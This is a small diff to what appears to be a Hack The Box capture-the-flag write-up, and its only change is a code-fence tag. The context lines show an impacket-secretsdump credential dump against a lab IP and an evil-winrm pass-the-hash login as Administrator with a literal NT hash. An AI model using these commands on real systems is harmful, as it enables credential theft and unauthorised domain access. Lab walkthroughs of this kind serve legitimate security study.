@@ -70,7 +70,7 @@ impacket-secretsdump HTB/evil:'EvilMachine1!'@10.129.95.210
 
 5. Finally, we can use the NTHash to log in as the administrator using the Windows Remote Management (WinRM) service:
 
-```Bash
+```bash
 evil-winrm -i 10.129.95.210 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
 ```
 
